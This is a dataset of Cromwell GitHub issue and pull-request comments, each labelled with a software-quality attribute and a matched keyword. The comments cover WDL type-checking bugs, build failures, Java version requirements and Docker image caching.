https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086:763,Availability,echo,echo,763,"@pshapiro4broad Unfortunately I'm still having issues with select_first() (apparently?) acting inconsistently. This passes miniwdl and Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input, ""/path/to/file.txt""])) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```. This passes miniwdl, but fails Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String foo = select_first([tsv_file_input, ""/path/to/file.txt""]); 		String tsv_arg = if defined(tsv_file_input) then basename(foo) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```; Cromwell's error is:; > 14:27:13.383 [main] ERROR io.dockstore.client.cli.ArgumentUtility - Problem parsing WDL file: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'; > 14:27:13.385 [main] ERROR io.dockstore.client.cli.ArgumentUtility - wdl.draft3.parser.WdlParser$SyntaxError: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'. To me, that seems to indicate that Cromwell's implentation of select_first() isn't consistently returning the same type, depending on where it is being used. It looks like in the first example it is correctly returning a String but in the second example it's returning a String?, but I don't see a meaningful difference between the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086:921,Availability,error,error,921,"@pshapiro4broad Unfortunately I'm still having issues with select_first() (apparently?) acting inconsistently. This passes miniwdl and Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input, ""/path/to/file.txt""])) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```. This passes miniwdl, but fails Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String foo = select_first([tsv_file_input, ""/path/to/file.txt""]); 		String tsv_arg = if defined(tsv_file_input) then basename(foo) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```; Cromwell's error is:; > 14:27:13.383 [main] ERROR io.dockstore.client.cli.ArgumentUtility - Problem parsing WDL file: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'; > 14:27:13.385 [main] ERROR io.dockstore.client.cli.ArgumentUtility - wdl.draft3.parser.WdlParser$SyntaxError: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'. To me, that seems to indicate that Cromwell's implentation of select_first() isn't consistently returning the same type, depending on where it is being used. It looks like in the first example it is correctly returning a String but in the second example it's returning a String?, but I don't see a meaningful difference between the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086:954,Availability,ERROR,ERROR,954,"@pshapiro4broad Unfortunately I'm still having issues with select_first() (apparently?) acting inconsistently. This passes miniwdl and Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input, ""/path/to/file.txt""])) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```. This passes miniwdl, but fails Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String foo = select_first([tsv_file_input, ""/path/to/file.txt""]); 		String tsv_arg = if defined(tsv_file_input) then basename(foo) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```; Cromwell's error is:; > 14:27:13.383 [main] ERROR io.dockstore.client.cli.ArgumentUtility - Problem parsing WDL file: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'; > 14:27:13.385 [main] ERROR io.dockstore.client.cli.ArgumentUtility - wdl.draft3.parser.WdlParser$SyntaxError: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'. To me, that seems to indicate that Cromwell's implentation of select_first() isn't consistently returning the same type, depending on where it is being used. It looks like in the first example it is correctly returning a String but in the second example it's returning a String?, but I don't see a meaningful difference between the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086:1310,Availability,ERROR,ERROR,1310,"@pshapiro4broad Unfortunately I'm still having issues with select_first() (apparently?) acting inconsistently. This passes miniwdl and Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input, ""/path/to/file.txt""])) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```. This passes miniwdl, but fails Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String foo = select_first([tsv_file_input, ""/path/to/file.txt""]); 		String tsv_arg = if defined(tsv_file_input) then basename(foo) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```; Cromwell's error is:; > 14:27:13.383 [main] ERROR io.dockstore.client.cli.ArgumentUtility - Problem parsing WDL file: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'; > 14:27:13.385 [main] ERROR io.dockstore.client.cli.ArgumentUtility - wdl.draft3.parser.WdlParser$SyntaxError: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'. To me, that seems to indicate that Cromwell's implentation of select_first() isn't consistently returning the same type, depending on where it is being used. It looks like in the first example it is correctly returning a String but in the second example it's returning a String?, but I don't see a meaningful difference between the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086:1780,Integrability,depend,depending,1780,"@pshapiro4broad Unfortunately I'm still having issues with select_first() (apparently?) acting inconsistently. This passes miniwdl and Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String tsv_arg = if defined(tsv_file_input) then basename(select_first([tsv_file_input, ""/path/to/file.txt""])) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```. This passes miniwdl, but fails Cromwell:. ```; version 1.0. task T {; 	input {; 		File? tsv_file_input; 		String foo = select_first([tsv_file_input, ""/path/to/file.txt""]); 		String tsv_arg = if defined(tsv_file_input) then basename(foo) else """"; 	}. 	command <<<; 		echo ~{tsv_arg}; 	>>>. }. workflow W {; 	input {; 		File? tsv_file_input; 	}. 	call T {; 		input:; 			tsv_file_input = tsv_file_input; 	}; }; ```; Cromwell's error is:; > 14:27:13.383 [main] ERROR io.dockstore.client.cli.ArgumentUtility - Problem parsing WDL file: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'; > 14:27:13.385 [main] ERROR io.dockstore.client.cli.ArgumentUtility - wdl.draft3.parser.WdlParser$SyntaxError: Failed to process task definition 'T' (reason 1 of 1): Failed to process expression 'select_first([tsv_arg, if defined(tsv_file_input) then basename(foo) else """"])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(foo)'. Expected 'File' but got 'String?'. To me, that seems to indicate that Cromwell's implentation of select_first() isn't consistently returning the same type, depending on where it is being used. It looks like in the first example it is correctly returning a String but in the second example it's returning a String?, but I don't see a meaningful difference between the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245982086
https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1237279136:7,Availability,down,downloaded,7,I just downloaded the `womtool-84.jar` at <https://github.com/broadinstitute/cromwell/releases> I didn't need to build the source.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1237279136
https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1237279136:86,Deployability,release,releases,86,I just downloaded the `womtool-84.jar` at <https://github.com/broadinstitute/cromwell/releases> I didn't need to build the source.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1237279136
https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1241312157:99,Deployability,Release,Releases,99,Cromwell requires Java 11 [0][1] and I see 17 there. [0] https://cromwell.readthedocs.io/en/stable/Releases/; [1] https://github.com/broadinstitute/cromwell/blob/develop/CHANGELOG.md#60-release-notes,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1241312157
https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1241312157:186,Deployability,release,release-notes,186,Cromwell requires Java 11 [0][1] and I see 17 there. [0] https://cromwell.readthedocs.io/en/stable/Releases/; [1] https://github.com/broadinstitute/cromwell/blob/develop/CHANGELOG.md#60-release-notes,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6902#issuecomment-1241312157
https://github.com/broadinstitute/cromwell/issues/6905#issuecomment-1717885213:129,Deployability,install,install,129,"I think it's extremely unlikely we will be attempting to support SELinux even on an infinite timescale. The vast majority of our install base runs in containers, either on Kubernetes or Docker. Sorry for the inconvenience.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6905#issuecomment-1717885213
https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:23,Modifiability,enhance,enhances,23,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649
https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:60,Modifiability,portab,portable,60,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649
https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:143,Modifiability,portab,portable,143,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649
https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:334,Testability,test,tests,334,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649
https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:401,Testability,test,tests,401,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649
https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649:680,Testability,test,testCentaurAws,680,"This memory-related PR enhances #6766. The former addresses portable `command <<< … >>>` blocks (across Cromwell backends) and this PR enables portable more-memory functionality. The prior ""[Side note](https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430)"" still applies. Instead of changing the existing Papi tests to run on all backends this PR adds (mostly copy/pasted) TES tests. This is because:; 1. As noted the `memory` runtime attribute isn't currently supported by the `Local` backend, and; 2. Other backends like `AWSBATCH` are [mostly disabled](https://github.com/broadinstitute/cromwell/blob/4884f735a7f3bd8863acf763bdac15b76fac9b2a/src/ci/bin/testCentaurAws.sh#L22-L27) in CI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6909#issuecomment-1250187649
https://github.com/broadinstitute/cromwell/issues/6910#issuecomment-1262745641:161,Modifiability,variab,variables,161,"That workaround has got me curious... My previous understanding is that moving things out of the input block only has the effect of making them act like private variables. The spec also says that this region of [""non-input declarations""](https://github.com/openwdl/wdl/blob/69bbcb2cba54346b757b21b5b60d5d270f759eaf/versions/1.0/SPEC.md#non-input-declarations) are supposed to act as intermediate values, so I'm surprised tsv_arg can remain in the input section (since by merit of it being there, it can be overwritten by the user). How is this section implemented in Cromwell? Is it effectively just an extension of the input section, but the user can't directly set their values?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6910#issuecomment-1262745641
https://github.com/broadinstitute/cromwell/pull/6925#issuecomment-1268856083:238,Usability,Simpl,Simply,238,"> @kpierre13 just a clarifying question - do we need to publish another Cromwell client so that these changes can be used by CBAS?. As far as I know, we do not. This action happens on the Cromwell end and doesn't effect any code in CBAS. Simply changing the functionality of this code that we call to.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6925#issuecomment-1268856083
https://github.com/broadinstitute/cromwell/pull/6927#issuecomment-1270500310:238,Availability,error,error,238,The CI unit tests are failing with:; > /home/travis/build/broadinstitute/cromwell/engine/src/test/scala/cromwell/webservice/SwaggerServiceSpec.scala:103:36: constructor Constructor in class Constructor is deprecated. I get the same build error locally. The deprecated class comes from SnakeYAML. Looking into it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6927#issuecomment-1270500310
https://github.com/broadinstitute/cromwell/pull/6927#issuecomment-1270500310:12,Testability,test,tests,12,The CI unit tests are failing with:; > /home/travis/build/broadinstitute/cromwell/engine/src/test/scala/cromwell/webservice/SwaggerServiceSpec.scala:103:36: constructor Constructor in class Constructor is deprecated. I get the same build error locally. The deprecated class comes from SnakeYAML. Looking into it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6927#issuecomment-1270500310
https://github.com/broadinstitute/cromwell/pull/6927#issuecomment-1270500310:93,Testability,test,test,93,The CI unit tests are failing with:; > /home/travis/build/broadinstitute/cromwell/engine/src/test/scala/cromwell/webservice/SwaggerServiceSpec.scala:103:36: constructor Constructor in class Constructor is deprecated. I get the same build error locally. The deprecated class comes from SnakeYAML. Looking into it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6927#issuecomment-1270500310
https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279449651:64,Testability,test,tests,64,Marking ready for review in the hope that the currently-running tests will pass.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279449651
https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279562796:142,Availability,error,errors,142,"@aednichols All the removals of the `new Integer(n)` calls are changes I made ""while I was in there"" to silence warnings. What with the other errors, I lost track of my intention to check in on whether it was reasonable to change that stuff. Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279562796
https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279624277:71,Deployability,update,update,71,"@jgainerdewar those Java files are auto-generated, so we would need to update the parser-generator in order to maintainably address the warnings. https://github.com/broadinstitute/cromwell/blob/622c8e6b79b4ce123912ace0ed37b28f1c461324/wdl/transforms/draft3/src/main/java/wdl/draft3/parser/WdlParser.java#L2-L14",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279624277
https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279624277:111,Modifiability,maintainab,maintainably,111,"@jgainerdewar those Java files are auto-generated, so we would need to update the parser-generator in order to maintainably address the warnings. https://github.com/broadinstitute/cromwell/blob/622c8e6b79b4ce123912ace0ed37b28f1c461324/wdl/transforms/draft3/src/main/java/wdl/draft3/parser/WdlParser.java#L2-L14",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279624277
https://github.com/broadinstitute/cromwell/issues/6946#issuecomment-1310582127:230,Performance,concurren,concurrent,230,"I already ruled that out -- Docker itself is still functional. I didn't run hello world specifically, but I did was able to `docker run --it` and run a few commands. This is different from the behavior I see when I do not set the concurrent job limit to 1 on a local backend -- in that scenario I wouldn't be able to run any images at all, and need to forcibly quit + restart Docker to use it. For comparison, I ran the same WDL with the same inputs in miniwdl to see if it'd also get stuck, but it did not have this issue. miniwdl was able to complete the 1000x scattered task + the final task that gathers the scattered input. So it seems that Docker itself can handle launching a thousand containers one at a time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6946#issuecomment-1310582127
https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1314223845:74,Integrability,depend,dependency,74,Builds locally but Travis is NOT happy about class conflicts with the new dependency.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1314223845
https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1314381430:70,Availability,error,error,70,Builds for me in IntelliJ (incl clean build) but I can reproduce this error locally with `sbt assembly`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1314381430
https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1315983228:142,Testability,test,tests,142,"I try to re-read the acceptance criteria of the story regularly as I progress on it, and was reminded that I shouldn't hold this up on adding tests. > We’ve thought through how to test code that uses these clients, and set things up to make that easy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1315983228
https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1315983228:180,Testability,test,test,180,"I try to re-read the acceptance criteria of the story regularly as I progress on it, and was reminded that I shouldn't hold this up on adding tests. > We’ve thought through how to test code that uses these clients, and set things up to make that easy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6948#issuecomment-1315983228
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381:48,Deployability,update,update,48,I found the code relating to the format. Please update the documentation :o). https://github.com/broadinstitute/cromwell/blob/32d5d0cbf07e46f56d3d070f457eaff0138478d5/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiDockerCacheMappingOperations.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381:192,Deployability,pipeline,pipelines,192,I found the code relating to the format. Please update the documentation :o). https://github.com/broadinstitute/cromwell/blob/32d5d0cbf07e46f56d3d070f457eaff0138478d5/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiDockerCacheMappingOperations.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381:248,Deployability,pipeline,pipelines,248,I found the code relating to the format. Please update the documentation :o). https://github.com/broadinstitute/cromwell/blob/32d5d0cbf07e46f56d3d070f457eaff0138478d5/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiDockerCacheMappingOperations.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381:265,Deployability,Pipeline,PipelinesApiDockerCacheMappingOperations,265,I found the code relating to the format. Please update the documentation :o). https://github.com/broadinstitute/cromwell/blob/32d5d0cbf07e46f56d3d070f457eaff0138478d5/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiDockerCacheMappingOperations.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321211381
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:475,Performance,cache,cache,475,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:571,Performance,cache,cache,571,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:624,Performance,cache,cached,624,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache 